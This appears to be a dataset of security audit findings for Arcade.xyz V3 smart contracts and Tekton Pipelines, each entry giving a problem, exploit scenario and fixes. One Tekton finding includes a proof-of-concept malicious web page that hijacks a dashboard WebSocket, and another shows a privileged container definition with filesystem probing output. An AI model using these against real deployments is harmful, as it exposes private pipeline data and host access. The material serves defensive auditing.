        "body": "Allowing asset vaults to be nested (e.g., vault A is owned by vault B, and vault B is owned by vault X, etc.) could result in a situation in which multiple asset vaults own each other. This would result in a deadlock preventing assets in the aected asset vaults from ever being withdrawn again. Asset vaults are designed to hold dierent types of assets, including ERC-721 tokens. The ownership of an asset vault is tracked by an accompanying ERC-721 token that is minted (gure 11.1) when the asset vault is deployed through the VaultFactory contract. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) payable(msg.sender).transfer(msg.value - Figure 11.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol To add an ERC-721 asset to an asset vault, it needs to be transferred to the asset vaults address. Because the ownership of an asset vault is tracked by an ERC-721 token, it is possible to transfer the ownership of an asset vault to another asset vault by simply transferring the ERC-721 token representing vault ownership. To withdraw ERC-721 tokens from an asset vault, the owner (the holder of the asset vaults ERC-721 token) needs to 43 Arcade.xyz V3 Security Assessment enable withdrawals (using the enableWithdraw function) and then call the withdrawERC721 (or withdrawBatch) function. 121 122 123 124 150 151 152 153 154 155 156 function enableWithdraw() external override onlyOwner onlyWithdrawDisabled { withdrawEnabled = true; emit WithdrawEnabled(msg.sender); } Figure 11.2: The enableWithdraw function in arcade-protocol/contracts/vault/AssetVault.sol function withdrawERC721( address token, uint256 tokenId, address to ) external override onlyOwner onlyWithdrawEnabled { _withdrawERC721(token, tokenId, to); } Figure 11.3: The withdrawERC721 function in arcade-protocol/contracts/vault/AssetVault.sol Only the owner of an asset vault can enable and perform withdrawals. Therefore, if two (or more) vaults own each other, it would be impossible for a user to enable or perform withdrawals on the aected vaults, permanently locking all assets (ERC-721, ERC-1155, ERC-20, ETH) within them. The severity of the issue depends on the UI, which was out of scope for this review. If the UI does not prevent vaults from owning each other, the severity of this issue is higher. In terms of likelihood, this issue would require a user to make a mistake (although a mistake that is far more likely than the transfer of tokens to a random address) and would require the UI to fail to detect and prevent or warn the user from making such a mistake. We therefore rated the diculty of this issue as high. Exploit Scenario Alice decides to borrow USDC by putting up some of her NFTs as collateral: 1. Alice uses the UI to create an asset vault (vault A) and transfers ve of her CryptoPunks to the asset vault. 2. The UI shows that Alice has another existing vault (vault X), which contains two Bored Apes. She wants to use these two vaults together to borrow a higher amount of USDC. She clicks on vault A and selects the Add Asset option. 3. The UI shows a list of assets that Alice owns, including the ERC-721 token that represents ownership of vault X. Alice clicks on Add, the transaction succeeds, and the vault X NFT is transferred to vault A. Vault X is now owned by vault A. 44 Arcade.xyz V3 Security Assessment 4. Alice decides to add another Bored Ape NFT that she owns to vault X. She opens the vault X page and clicks on Add Assets, and the list of assets that she can add shows the ERC-721 token that represents ownership of vault A. 5. Alice is confused and wonders if adding vault X to vault A worked (step 3). She decides to add vault A to vault X instead. The transaction succeeds, and now vault A owns vault X and vice versa. Alice is now unable to withdraw any of the assets from either vault. Recommendations Short term, take one of the following actions:  Disallow the nesting of asset vaults. That is, prevent users from being able to transfer ownership of an asset vault to another asset vault. This would prevent the issue altogether.  If allowing asset vaults to be nested is a desired feature, update the UI to prevent two or more asset vaults from owning each other (if it does not already do so). Also, update the documentation so that other integrating smart contract protocols are aware of the issue. Long term, when dealing with the nesting of assets, consider edge cases and write extensive tests that ensure these edge cases are handled correctly and that users do not lose access to their assets. Other than unit tests, we recommend writing invariants and testing them using property-based testing with Echidna. 45 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Risk of locked assets due to use of _mint instead of _safeMint ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The asset vault and promissory note ERC-721 tokens are minted via the _mint function rather than the _safeMint function. The _safeMint function includes a necessary safety check that validates a recipient contracts ability to receive and handle ERC-721 tokens. Without this safeguard, tokens can inadvertently be sent to an incompatible contract, causing them, and any assets they hold, to become irretrievable. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) payable(msg.sender).transfer(msg.value - Figure 12.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol function mint(address to, uint256 loanId) external override returns (uint256) if (!hasRole(MINT_BURN_ROLE, msg.sender)) revert 135 { 136 PN_MintingRole(msg.sender); 137 138 139 140 return loanId; _mint(to, loanId); } Figure 12.2: The mint function in arcade-protocol/contracts/PromissoryNote.sol 46 Arcade.xyz V3 Security Assessment The _safeMint functions built-in safety check ensures that the recipient contract has the necessary ERC721Receiver implementation, verifying the contracts ability to receive and manage ERC-721 tokens. 258 259 260 261 262 263 264 265 266 267 268 function _safeMint( address to, uint256 tokenId, bytes memory _data ) internal virtual { _mint(to, tokenId); require( _checkOnERC721Received(address(0), to, tokenId, _data), \"ERC721: transfer to non ERC721Receiver implementer\" ); } Figure 12.3: The _safeMint function in openzeppelin-contracts/contracts/token/ERC721/ERC721.sol The _checkOnERC721Received method invokes the onERC721Received method on the receiving contract, expecting a return value containing the bytes4 selector of the onERC721Received method. A successful pass of this check implies that the contract is indeed capable of receiving and processing ERC-721 tokens. The _safeMint function does allow for reentrancy through the calling of _checkOnERC721Received on the receiver of the token. However, based on the order of operations in the aected functions in Arcade (gures 12.1 and 12.2), this poses no risk. Exploit Scenario Alice initializes a new asset vault by invoking the initializeBundle function of the VaultFactory contract, passing in her smart contract wallet address as the to argument. She transfers her valuable CryptoPunks NFT, intended to be used for collateral, to the newly created asset vault. However, she later discovers that her smart contract wallet lacks support for ERC-721 tokens. As a result, both her asset vault token and the CryptoPunks NFT become irretrievable, stuck within her smart wallet contract due to the absence of a mechanism to handle ERC-721 tokens. Recommendations Short term, use the _safeMint function instead of _mint in the PromissoryNote and VaultFactory contracts. The _safeMint function includes vital checks that ensure the recipient is equipped to handle ERC-721 tokens, thus mitigating the risk that NFTs could become frozen. Long term, enhance the unit testing suite. These tests should encompass more negative paths and potential edge cases, which will help uncover any hidden vulnerabilities or bugs like this one. Additionally, it is critical to test user-provided inputs extensively, covering a 47 Arcade.xyz V3 Security Assessment broad spectrum of potential scenarios. This rigorous testing will contribute to building a more secure, robust, and reliable system. 48 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Borrowers cannot realize full loan value without risking default ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "To fully capitalize on their loans, borrowers need to retain their loaned assets and the owed interest for the entire term of their loans. However, if a borrower waits until the loans maturity date to repay it, they become immediately vulnerable to liquidation of their collateral by the lender. As soon as the block.timestamp value exceeds the dueDate value, a lender can invoke the claim function to liquidate the borrowers collateral. 293 294 295 // First check if the call is being made after the due date. uint256 dueDate = data.startDate + data.terms.durationSecs; if (dueDate >= block.timestamp) revert LC_NotExpired(dueDate); Figure 13.1: A snippet of the claim function in arcade-protocol/contracts/LoanCore.sol Owing to the inherent nature of the blockchain, achieving precise synchronization between the block.timestamp and the dueDate is practically impossible. Moreover, repaying a loan before the dueDate would result in a loss of some of the loans inherent value because the protocols interest assessment design does not refund any part of the interest for early repayment. In a scenario in which block.timestamp is greater than dueDate, a lender can preempt a borrowers loan repayment attempt, invoke the claim function, and liquidate the borrowers collateral. Frequently, collateral will be worth more than the loaned assets, giving lenders an incentive to do this. Given the protocols interest assessment design, the Arcade team should implement a grace period following the maturity date where no additional interest is expected to be assessed beyond the period agreed to in the loan terms. This buer would give the borrower an opportunity to fully capitalize on the term of their loan without the risk of defaulting and losing their collateral. 49 Arcade.xyz V3 Security Assessment Exploit Scenario Alice, a borrower, takes out a loan from Eve using Arcades NFT lending protocol. Alice deposits her rare CryptoPunk as collateral, which is more valuable than the assets loaned to her, so that her position is over-collateralized. Alice plans to hold on to the lent assets for the entire duration of the loan period in order to maximize her benet-to-cost ratio. Eve, the lender, is monitoring the blockchain for the moment when the block.timestamp is greater than or equal to the dueDate so that she can call the claim function and liquidate Alices CryptoPunk. As soon as the loan term is up, Alice submits a transaction to the repay function, and Eve front-runs that transaction with her own call to the claim function. As a result, Eve is able to liquidate Alices CryptoPunk collateral. Recommendations Short term, introduce a grace period after the loan's maturity date during which the lender cannot invoke the claim function. This buer would give the borrower sucient time to repay the loan without the risk of immediate collateral liquidation. Long term, revise the protocol's interest assessment design to allow a portion of the interest to be refunded in cases of early repayment. This change could reduce the incentive for borrowers to delay repayment until the last possible moment. Additionally, provide better education for borrowers on how the lending protocol works, particularly around critical dates and actions, and improve communication channels for borrowers to raise concerns or seek clarication. 50 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. itemPredicates encoded incorrectly according to EIP-712 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The itemPredicates parameter is not encoded correctly, so the signer cannot see the verier address when signing. The verier address receives each batch of listed assets to check them for correctness and existence, which is vital to ensuring the security and integrity of the lending transaction. According to EIP-712, structured data should be hashed in conjunction with its typeHash. The following is the hashStruct function as dened in EIP-712: hashStruct(s : ) = keccak256(typeHash  encodeData(s)) where typeHash = keccak256(encodeType(typeOf(s))) In the protocol, the recoverItemsSignature function hashes an array of Predicate[] structs that are passed in as the itemPredicates argument. The function encodes and hashes the array without adding the Predicate typeHash to each member of the array. The hashed output of that operation is then included in the _ITEMS_TYPEHASH variable as a bytes32 type, referred to as itemsHash. 208 209 210 211 212 213 214 (bytes32 sighash, address externalSigner) = recoverItemsSignature( loanTerms, sig, nonce, neededSide, keccak256(abi.encode(itemPredicates)) ); Figure 14.1: A snippet of the initializeLoanWithItems function in arcade-protocol/contracts/OriginationController.sol keccak256( bytes32 private constant _ITEMS_TYPEHASH = 85 86 87 88 proratedInterestRate,uint256 principal,address collateralAddress,bytes32 itemsHash,address payableCurrency,bytes32 affiliateCode,uint160 nonce,uint8 side)\" 89 // solhint-disable max-line-length \"LoanTermsWithItems(uint32 durationSecs,uint32 deadline,uint160 ); 51 Arcade.xyz V3 Security Assessment Figure 14.2: The _ITEMS_TYPEHASH variable in arcade-protocol/contracts/OriginationController.sol However, this method of encoding an array of structs is not consistent with the EIP-712 guidelines, which stipulates the following: The array values are encoded as the keccak256 hash of the concatenated encodeData of their contents (i.e., the encoding of SomeType[5] is identical to that of a struct containing ve members of type SomeType). The struct values are encoded recursively as hashStruct(value). This is undened for cyclical data. Therefore, the protocol should iterate over the itemPredicates array, encoding each Predicate instance separately with its respective typeHash. Exploit Scenario Alice creates a loan oering that takes CryptoPunks as collateral. She submits the loan terms to the Arcade protocol. Bob, a CryptoPunk holder, navigates the Arcade UI to accept Alices loan terms. An EIP-712 signature request appears in MetaMask for Bob to sign. Bob cannot validate whether the message he is signing uses the CryptoPunk verier contract because that information is not included in the hash. Recommendations Short term, adjust the encoding of itemPredicates to comply with EIP-712 standards. Have the code iterate through the itemPredicates array and encode each Predicate instance separately with its associated typeHash. Additionally, refactor the _ITEMS_TYPEHASH variable so that the Predicate typeHash denition is appended to it and replace the bytes32 itemsHash parameter with Predicate[] items. This revision will allow the signer to see the verier address of the message they are signing, ensuring the validity of each batch of items, in addition to complying with the EIP-712 standard. Long term, strictly adhere to established Ethereum protocols such as EIP-712. These standards exist to ensure interoperability, security, and predictable behavior in the Ethereum ecosystem. Violating these norms can lead to unforeseen security vulnerabilities. 52 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. The fee values can distort the incentives for the borrowers and lenders ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "Arcade V3 contains nine fee settings. Six of these fees are to be paid by the lender, two are to be paid by the borrower, and the remaining fee is to be paid by the borrower if they decide to mint a new vault for their collateral. Depending on the values of these settings, the incentives can change for both loan counterparties. For example, to create a new loan, both the borrower and lender have to pay origination fees, and eventually, the loan must be rolled over, repaid, or defaulted. In the rst case, both the new lender and borrower pay rollover fees; note that the original lender pays no fees at all for closing the loan. In the second case, the lender pays interest fees and principal fees on closing the loan. Finally, if the loan is defaulted, the lender pays a default fee to liquidate the collateral. The various fees paid based on the outcome of the loan can result in an interesting incentive game for investors in the protocol, depending on the actual values of the fee settings. If the lender rollover fee is cheaper than the origination fee, investors may be incentivized to roll over existing loans instead of creating new ones, beneting the original lenders by saving them the closing fees, and harming the borrowers by indirectly raising the interest rates to compensate. Similarly, if the lender rollover fees are higher than the closing fees, lenders will be less incentivized to rollover loans. In summary, having such ne control over possible fee settings introduces hard-to-predict incentives scenarios that can scare users away or cause users who do not account for fees to inadvertently lose prots. Recommendations Short term, clearly inform borrowers and lenders of all of the existing fees and their current values at the moment a loan is opened, as well as the various possible outcomes, including the expected net prots if the loan is repaid, rolled over, defaulted, or redeemed. Long term, add interactive ways for users to calculate their expected prots, such as a loan simulator. 53 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Di\u0000erent zero-address errors thrown by single and batch NFT withdrawal functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The withdrawBatch function throws an error that is dierent from the single NFT withdrawal functions (withdrawERC721, withdrawERC1155). This could confuse users and other applications that interact with the Arcade contracts. The withdrawBatch function throws a custom error (AV_ZeroAddress) if the to parameter is set to the zero address. The single NFT withdrawal functions withdrawERC721 and withdrawERC1155 do not explicitly check the to parameter. All three of these functions internally call the _withdrawERC721 and _withdrawERC1155 functions, which also do not explicitly check the to parameter. The lack of such a check is not a problem: according to the ERC-721 and ERC-1155 standards, a transfer must revert if to is the zero address, so the single NFT withdrawal functions will revert on this condition. However, they will revert with the error message that is dened inside the actual NFT contract instead of the Arcade AV_ZeroAddress error, which is thrown when withdrawBatch reverts. ) external override onlyOwner onlyWithdrawEnabled { uint256 tokensLength = tokens.length; if (tokensLength > MAX_WITHDRAW_ITEMS) revert address[] calldata tokens, uint256[] calldata tokenIds, TokenType[] calldata tokenTypes, address to function withdrawBatch( 193 194 195 196 197 198 199 200 AV_TooManyItems(tokensLength); 201 202 AV_LengthMismatch(\"tokenType\"); 203 204 205 206 if (to == address(0)) revert AV_ZeroAddress(); for (uint256 i = 0; i < tokensLength; i++) { if (tokens[i] == address(0)) revert AV_ZeroAddress(); if (tokensLength != tokenIds.length) revert AV_LengthMismatch(\"tokenId\"); if (tokensLength != tokenTypes.length) revert 22 Arcade.xyz V3 Security Assessment Figure 1.1: A snippet of the withdrawBatch function in arcade-protocol/contracts/vault/AssetVault.sol Additionally, the CryptoPunks NFT contract does not follow the ERC-721 and ERC-1155 standards and contains no check that prevents funds from being transferred to the zero address (and the function is called transferPunk instead of the standard transfer). An explicit check to ensure that to is not the zero address inside the withdrawPunk function is therefore recommended. 114 115 116 117 118 119 120 121 122 123 124 125 126 it. 127 128 129 130 131 132 133 134 function transferPunk(address to, uint punkIndex) { if (!allPunksAssigned) throw; if (punkIndexToAddress[punkIndex] != msg.sender) throw; if (punkIndex >= 10000) throw; if (punksOfferedForSale[punkIndex].isForSale) { punkNoLongerForSale(punkIndex); } punkIndexToAddress[punkIndex] = to; balanceOf[msg.sender]--; balanceOf[to]++; Transfer(msg.sender, to, 1); PunkTransfer(msg.sender, to, punkIndex); // Check for the case where there is a bid from the new owner and refund // Any other bid can stay in place. Bid bid = punkBids[punkIndex]; if (bid.bidder == to) { // Kill bid and refund value pendingWithdrawals[to] += bid.value; punkBids[punkIndex] = Bid(false, punkIndex, 0x0, 0); } } Figure 1.2: The transferPunk function in CryptoPunksMarket contract (Etherscan) Lastly, there is no string argument to the AV_ZeroAddress error to indicate which variable equaled the zero address and caused the revert, unlike the AV_LengthMismatch error. For example, in the batch function (gure 1.1), the AV_ZeroAddress could be thrown in line 203 or 206. Exploit Scenario Bob, a developer of a front-end blockchain application that interacts with the Arcade contracts, develops a page that interacts with an AssetVault contract. In his implementation, he catches specic errors that are thrown so that he can show an informative message to the user. Because the batch and withdrawal functions throw dierent errors when to is the zero address, he needs to write two versions of error handlers instead of just one. 23 Arcade.xyz V3 Security Assessment Recommendations Short term, add the zero address check with the custom error to the _withdrawERC721 and _withdrawERC1155 functions. This will cause the same custom error to be thrown for all of the single and batch NFT withdrawal functions. Also, add an explicit zero-address check inside the withdrawPunk function. Lastly, add a string argument to the AV_ZeroAddress custom error that is used to indicate the name of the variable that triggered the error (similar to the one in AV_LengthMismatch). Long term, ensure consistency in the errors thrown throughout the implementation. This will allow users and developers to understand errors that are thrown and will allow the Arcade team to test fewer errors. 24 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Asset vault nesting can lead to loss of assets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "Allowing asset vaults to be nested (e.g., vault A is owned by vault B, and vault B is owned by vault X, etc.) could result in a situation in which multiple asset vaults own each other. This would result in a deadlock preventing assets in the aected asset vaults from ever being withdrawn again. Asset vaults are designed to hold dierent types of assets, including ERC-721 tokens. The ownership of an asset vault is tracked by an accompanying ERC-721 token that is minted (gure 11.1) when the asset vault is deployed through the VaultFactory contract. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) payable(msg.sender).transfer(msg.value - Figure 11.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol To add an ERC-721 asset to an asset vault, it needs to be transferred to the asset vaults address. Because the ownership of an asset vault is tracked by an ERC-721 token, it is possible to transfer the ownership of an asset vault to another asset vault by simply transferring the ERC-721 token representing vault ownership. To withdraw ERC-721 tokens from an asset vault, the owner (the holder of the asset vaults ERC-721 token) needs to 43 Arcade.xyz V3 Security Assessment enable withdrawals (using the enableWithdraw function) and then call the withdrawERC721 (or withdrawBatch) function. 121 122 123 124 150 151 152 153 154 155 156 function enableWithdraw() external override onlyOwner onlyWithdrawDisabled { withdrawEnabled = true; emit WithdrawEnabled(msg.sender); } Figure 11.2: The enableWithdraw function in arcade-protocol/contracts/vault/AssetVault.sol function withdrawERC721( address token, uint256 tokenId, address to ) external override onlyOwner onlyWithdrawEnabled { _withdrawERC721(token, tokenId, to); } Figure 11.3: The withdrawERC721 function in arcade-protocol/contracts/vault/AssetVault.sol Only the owner of an asset vault can enable and perform withdrawals. Therefore, if two (or more) vaults own each other, it would be impossible for a user to enable or perform withdrawals on the aected vaults, permanently locking all assets (ERC-721, ERC-1155, ERC-20, ETH) within them. The severity of the issue depends on the UI, which was out of scope for this review. If the UI does not prevent vaults from owning each other, the severity of this issue is higher. In terms of likelihood, this issue would require a user to make a mistake (although a mistake that is far more likely than the transfer of tokens to a random address) and would require the UI to fail to detect and prevent or warn the user from making such a mistake. We therefore rated the diculty of this issue as high. Exploit Scenario Alice decides to borrow USDC by putting up some of her NFTs as collateral:",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Malicious borrowers can use forceRepay to grief lenders ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "A malicious borrower can grief a lender by calling the forceRepay function instead of the repay function; doing so would allow the borrower to pay less in gas fees and require the lender to perform a separate transaction to retrieve their funds (using the redeemNote function) and to pay a redeem fee. At any time after the loan is set and before the lender claims the collateral if the loan is past its due date, the borrower has to pay their full debt back in order to recover their assets. For doing so, there are two functions in RepaymentController: repay and forceRepay. The dierence between them is that the latter transfers the tokens to the LoanCore contract instead of directly to the lender. It is meant to allow the borrower to pay their obligations when the lender cannot receive tokens for any reason. For the lender to get their tokens back in this scenario, they must call the redeemNote function in RepaymentController, which in turn calls LoanCore.redeemNote, which transfers the tokens to an address set by the lender in the call. Because the borrower is free to decide which function to call to repay their debt, they can arbitrarily decide to do so via forceRepay, obligating the lender to send a transaction (with its associated gas fees) to recover their tokens. Additionally, depending on the conguration of the protocol, it is possible that the lender has to pay an additional fee (LENDER_REDEEM_FEE) to get back their own tokens, cutting their prots with no chance to opt out. 126 127 128 129 130 RC_InvalidState(data.state); 131 132 133 134 BASIS_POINTS_DENOMINATOR; function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 54 Arcade.xyz V3 Security Assessment 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 16.1: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Note that, from the perspective of the borrower, it is actually cheaper to call forceRepay than repay because of the gas saved by not transferring the tokens to the lender and not burning one of the promissory notes. Exploit Scenario Bob has to pay back his loan, and he decides to do so via forceRepay to save gas in the transaction. Lucy, the lender, wants her tokens back. She is now forced to call redeemNote to get them. In this transaction, she lost the gas fees that the borrower would have paid to send the tokens directly to her, and she has to pay an additional fee (LENDER_REDEEMER_FEE), causing her to receive less value from the loan than she originally expected. Recommendations Short term, remove the incentive (the lower gas cost) for the borrower to call forceRepay instead of repay. Consider taking one of the following actions:  Force the lender to always pull their funds using the redeemNote function. This can be achieved by removing the repay function and requiring the borrower to call forceRepay.  Remove the forceRepay function and modify the repay function so that it transfers the funds to the lender in a try/catch statement and creates a redeem note (which the lender can exchange for their funds using the redeemNote function) only if that transfer fails. Long term, when designing a smart contract protocol, always consider the incentives for each party to perform actions in the protocol, and avoid making an actor pay for the mistakes or maliciousness of others. By thoroughly documenting the incentives structure, aws can be spotted and mitigated before the protocol goes live. 55 Arcade.xyz V3 Security Assessment A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. The use of time.After() in select statements can lead to memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "Calls to time.After in for/select statements can lead to memory leaks because the garbage collector does not clean up the underlying Timer object until the timer res. A new timer, which requires resources, is initialized at each iteration of the for loop (and, hence, the select statement). As a result, many routines originating from the time.After call could lead to overconsumption of the memory. for { select { case <-ctx.Done(): // When the context is cancelled, stop reporting. return case <-time.After(r.ReportingPeriod): // Every 30s surface a metric for the number of running pipelines. if err := r.RunningPipelineRuns(lister); err != nil { logger.Warnf(\"Failed to log the metrics : %v\", err) } Figure 1.1: tektoncd/pipeline/pkg/pipelinerunmetrics/metrics.go#L290-L300 for { select { case <-ctx.Done(): // When the context is cancelled, stop reporting. return case <-time.After(r.ReportingPeriod): // Every 30s surface a metric for the number of running tasks. if err := r.RunningTaskRuns(lister); err != nil { logger.Warnf(\"Failed to log the metrics : %v\", err) } } Figure 1.2: pipeline/pkg/taskrunmetrics/metrics.go#L380-L391 Exploit Scenario An attacker nds a way to overuse a function, which leads to overconsumption of the memory and causes Tekton Pipelines to crash. Recommendations Short term, consider refactoring the code that uses the time.After function in for/select loops using tickers. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, ensure that the time.After method is not used in for/select routines. Periodically use the Semgrep query to check for and detect similar patterns. References  Use with caution time.After Can cause memory leak (golang)  Golang <-time.After() is not garbage collected before expiry",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Risk of resource exhaustion due to the use of defer inside a loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "The ExecuteInterceptors function runs all interceptors congured for a given trigger inside a loop. The res.Body.Close() function is deferred at the end of the loop. Calling defer inside of a loop could cause resource exhaustion conditions because the deferred function is called when the function exits, not at the end of each loop. As a result, resources from each interceptor object are accumulated until the end of the for statement. While this may not cause noticeable issues in the current state of the application, it is best to call res.Body.Close() at the end of each loop to prevent unforeseen issues. func (r Sink) ExecuteInterceptors(trInt []*triggersv1.TriggerInterceptor, in *http.Request, event []byte, log *zap.SugaredLogger, eventID string, triggerID string, namespace string, extensions map[string]interface{}) ([]byte, http.Header, *triggersv1.InterceptorResponse, error) { if len(trInt) == 0 { return event, in.Header, nil, nil } // (...) for _, i := range trInt { if i.Webhook != nil { // Old style interceptor // (...) defer res.Body.Close() Figure 2.1: triggers/pkg/sink/sink.go#L428-L469 Recommendations Short term, rather than deferring the call to res.Body.Close(), add a call to res.Body.Close() at the end of the loop.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of access controls for Tekton Pipelines API ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "The Tekton Pipelines extension uses an API to process requests for various tasks such as listing namespaces and creating TaskRuns. While Tekton provides documentation on enabling OAuth2 authentication, the API is unauthenticated by default. Should a Tekton operator expose the dashboard for other users to monitor their own deployments, every API method would be available to them, allowing them to perform tasks on namespaces that they do not have access to. Figure 3.1: Successful unauthenticated request Exploit Scenario An attacker discovers the endpoint exposing the Tekton Pipelines API and uses it to perform destructive tasks such as deleting PipelineRuns. Furthermore, the attacker can discover potentially sensitive information pertaining to deployments congured in Tekton. Recommendations Short term, add documentation on securing access to the API using Kubernetes security controls, including explicit documentation on the security implications of exposing access to the dashboard and, therefore, the API. Long term, add an access control mechanism for controlling who can access the API and limiting access to namespaces as needed and/or possible. 4. Insu\u0000cient validation of volumeMounts paths Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-4 Target: Various",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Missing validation of Origin header in WebSocket upgrade requests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "Tekton Dashboard uses the WebSocket protocol to provide real-time updates for TaskRuns, PipelineRuns, and other Tekton data. The endpoints responsible for upgrading the incoming HTTP request to a WebSocket request do not validate the Origin header to ensure that the request is coming from a trusted origin (i.e., the dashboard itself). As a result, arbitrary malicious web pages can connect to Tekton Dashboard and receive these real-time updates, which may include sensitive information, such as the log output of TaskRuns and PipelineRuns. Exploit Scenario A user hosts Tekton Dashboard on a private address, such as one in a local area network or a virtual private network (VPN), without enabling application-layer authentication. An attacker identies the URL of the dashboard instance (e.g., http://192.168.3.130:9097) and hosts a web page with the following content: <script> var ws = new WebSocket(\"ws://192.168.3.130:9097/apis/tekton.dev/v1beta1/namespaces/tekton-pipelin es/pipelineruns/?watch=true&resourceVersion=1770\"); ws.onmessage = function (event) { console.log(event.data); } </script> Figure 5.1: A malicious web page that extracts Tekton Dashboard WebSocket updates The attacker convinces the user to visit the web page. Upon loading it, the users browser successfully connects to the Tekton Dashboard WebSocket endpoint for monitoring PipelineRuns and logs received messages to the JavaScript console. As a result, the attackers untrusted web origin now has access to real-time updates from a dashboard instance on a private network that would otherwise be inaccessible outside of that network. Figure 5.2: The untrusted origin http://localhost:8080 has access to Tekton Dashboard WebSocket messages. Recommendations Short term, modify the code so that it veries that the Origin header of WebSocket upgrade requests corresponds to the trusted origin on which Tekton Dashboard is served. For example, if the origin is not http://192.168.3.130:9097, Tekton Dashboard should reject the incoming request. 6. Import resources feature does not validate repository URL scheme Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-6 Target: Dashboard",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Tekton allows users to create privileged containers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "Tekton allows users to dene task and sidecar objects with a privileged security context, which eectively grants task containers all capabilities. Tekton operators can use admission controllers to disallow users from using this option. However, information on this mitigation in the guidance documents for Tekton Pipelines is insucient and should be made clear. If an attacker gains code execution on any of these containers, the attacker could break out of it and gain full access to the host machine. We were not able to escape step containers running in privileged mode during the time allotted for this audit. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: build-push-secret-10 spec: serviceAccountName: build-bot taskSpec: steps: - name: secret securityContext: privileged: true image: ubuntu script: | #!/usr/bin/env bash sleep 20m Figure 8.1: TaskRun denition with the privileged security context root@build-push-secret-10-pod:/proc/fs# find -type f -maxdepth 5 -writable find: warning: you have specified the global option -maxdepth after the argument -type, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it. Please specify global options before other arguments. ./xfs/xqm ./xfs/xqmstat ./cifs/Stats ./cifs/cifsFYI ./cifs/dfscache ./cifs/traceSMB ./cifs/DebugData ./cifs/open_files ./cifs/SecurityFlags ./cifs/LookupCacheEnabled 